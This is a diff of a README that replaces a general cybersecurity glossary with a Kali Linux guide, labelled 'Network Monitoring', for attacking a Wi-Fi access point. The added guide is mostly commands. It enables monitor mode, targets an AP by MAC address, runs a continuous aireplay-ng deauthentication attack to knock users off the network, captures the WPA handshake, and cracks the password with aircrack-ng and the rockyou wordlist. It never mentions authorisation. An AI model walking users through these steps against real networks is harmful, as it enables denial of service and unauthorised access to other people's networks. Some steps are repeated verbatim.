@@ -1,36 +1,140 @@
-## Cyber Security
-Cyber security refers to the practice of protecting systems, networks, and programs from digital attacks. These cyber attacks are usually aimed at accessing, changing, or destroying sensitive information, extorting money from users, or interrupting normal business processes.
-## Hacking
-Hacking is the act of exploiting weaknesses in a computer system or network to gain unauthorized access to data. It can be done for various reasons, including financial gain, protest, gathering information, or simply for the challenge.
-## Who is a Hacker?
-A hacker is an individual who uses their technical skills to gain unauthorized access to systems, networks, or data. Hackers can be motivated by a variety of reasons, including profit, protest, information gathering, or the thrill of the challenge.
-## What is Ethical Hacking?
-Ethical hacking involves an authorized attempt to gain unauthorized access to a system, application, or data. Ethical hackers, also known as white-hat hackers, perform security assessments to improve the security of an organization's systems and networks.
-## Types of Hackers
-- Black hat: These are malicious hackers who break into systems for personal gain or to inflict harm.
-- Grey hat: These hackers may break into systems without permission but then report the vulnerabilities to the owner, sometimes requesting a fee to fix the issue.
-- White hat: Also known as ethical hackers, they are employed to test and ensure the security of an organization's systems.
-## Skills Needed to Become a Professional Hacker
-1. Add Secret Writing to Your Skill Set: Learn cryptography and encryption techniques to protect data and communications.
-2. Delve Deeper into Hacking: Gain a deeper understanding of hacking techniques, tools, and methodologies.
-3. Explore Vulnerabilities: Study and identify weaknesses in systems, applications, and networks.
-4. Experiment and Practice to Ace Hacking: Continuously practice hacking in a safe and controlled environment to improve your skills.
-5. Attend Discussions and Expert Hackers: Engage in discussions, attend conferences, and learn from experienced hackers to stay updated with the latest trends and techniques.
-## Red Team
-Red teams are offensive security professionals who simulate attacks to identify vulnerabilities.
-- Penetration Testing: Simulating attacks to identify security weaknesses.
-- Vulnerability Scanning: Using tools to find and exploit vulnerabilities.
-- Social Engineering: Manipulating people into divulging confidential information.
-- Threat Intelligence: Gathering information about potential threats to improve security measures.
-- Custom Toolset Development: Creating specialized tools for specific hacking tasks.
-## Purple Team
-Purple teams enhance collaboration between red and blue teams to improve overall security.
-- Collaboration: Working together to identify and address security issues.
-- Information Sharing: Exchanging information about threats and vulnerabilities.
-- Reporting and Analysis: Documenting findings and analyzing data to improve security.
-## Blue Team
-Blue teams are defensive security professionals who protect an organization from attacks.
-- Network Monitoring: Keeping an eye on network activity to detect suspicious behavior.
-- Data and Log Analysis: Analyzing logs and data to identify security incidents.
-- Risk Assessments: Evaluating risks to prioritize security measures.
-- Threat Detection: Identifying and responding to security threats.
+# Network Monitoring
+
+## Overview
+This document provides a step-by-step guide for using various network monitoring and penetration testing commands on Kali Linux. Follow these instructions to check your Kali Linux version, verify network interfaces, manage processes, enable monitor mode, and perform deauthentication attacks using tools like `airmon-ng`, `airodump-ng`, `aireplay-ng`, `wireshark`, and `aircrack-ng`.
+
+## Instructions
+
+### Check Kali Linux Version
+To determine which version of Kali Linux you are using, execute the following commands:
+```sh
+cat /etc/os-release
+uname -a
+```
+
+### Check Internet Connection and Network Interfaces
+
+Use the following commands to check the status of your network interfaces:
+
+```
+iwconfig   
+ifconfig
+ip addr
+```
+
+
+### Kill Conflicting Processes
+
+Before starting monitor mode, kill any processes that might interfere:
+
+```sh
+
+sudo airmon-ng check kill
+```
+### Start Monitor Mode
+
+Enable monitor mode on your wireless interface (e.g., wlan0):
+
+```sh
+
+sudo airmon-ng start wlan0
+```
+### Verify Monitor Mode
+
+Confirm that monitor mode is enabled using:
+
+```sh
+
+sudo airmon-ng
+# or
+iwconfig
+```
+
+### Capture AP's MAC Address and Channel
+
+Use airodump-ng to identify the Access Point (AP) you want to target:
+
+```sh
+
+sudo airodump-ng wlan0mon
+```
+
+Note down the AP's MAC address and channel. For example:
+
+    AP-MAC: 90:9A:4A:B8:F3:FB
+    Channel: 2
+
+### Start Packet Capture
+
+Open a new terminal window and start capturing packets:
+
+```sh
+
+sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
+```
+### Perform Deauthentication Attack
+
+In another terminal window, execute the deauthentication attack:
+
+```sh
+
+sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
+```
+### Analyze Captured Packets
+
+Open the captured packets file in Wireshark:
+
+```sh
+
+wireshark hack1-01.cap
+```
+Filter by eapol to find the handshake packets.
+### Stop Monitor Mode
+
+After completing the capture, stop monitor mode:
+
+```sh
+
+sudo airmon-ng stop wlan0mon
+```
+### Crack the Password
+
+Use aircrack-ng to crack the password from the captured handshake:
+
+```sh
+
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
+```
+### Display Specific AP
+
+To focus on a specific AP, use the following command:
+
+```sh
+
+sudo airodump-ng wlan0mon -d 90:9A:4A:B8:F3:FB
+```
+### Deauthenticate User
+
+To deauthenticate a user and stop their service, use:
+
+```sh
+
+sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
+```
+### Change Network Mode
+
+Switch from 'Monitor' mode back to 'Managed Access Point' mode:
+
+```sh
+
+sudo airmon-ng stop wlan0mon
+```
+
+### Final Password Crack Attempt
+
+Perform the final password crack attempt:
+
+```sh
+
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
+```
